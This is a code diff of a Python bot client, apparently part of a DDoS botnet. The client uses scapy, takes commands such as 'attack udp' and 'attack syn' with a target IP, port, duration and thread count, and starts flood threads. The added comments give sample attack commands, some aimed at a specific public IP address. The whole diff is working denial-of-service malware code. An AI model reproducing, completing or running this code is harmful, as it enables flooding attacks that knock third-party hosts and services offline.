@@ -1,9 +1,10 @@
+from scapy.all import *
 from threading import Thread
 from time import time, sleep
 import socket, signal
 import sys, random
 from typing import Tuple
-from scapy.all import *
+
 
 class Client():
     run=False
@@ -62,7 +63,8 @@ class Client():
         while True:
             data = self._recv()
             if "udp" in data:
-                #attack udp 192.168.1.1 50 120 3000
+                #attack udp 27.64.57.85 50 120 3000
+                # attack udp 192.168.1.10 80 120 3000
                 data=data.replace("attack ","").split()
                 try:
                     proto, ip, port, sec, thread =  data #tge data include the ip, port, protocol, and thread
@@ -76,6 +78,7 @@ class Client():
                 self.run = True
                 Thread(target=self.__ddos, args=data).start()
             elif "syn" in data:
+                #attack syn 27.64.57.85 1000 120 5000
                 data = data.replace("attack ", "").split()
                 try:
                     proto, ip, port, sec, thread = data
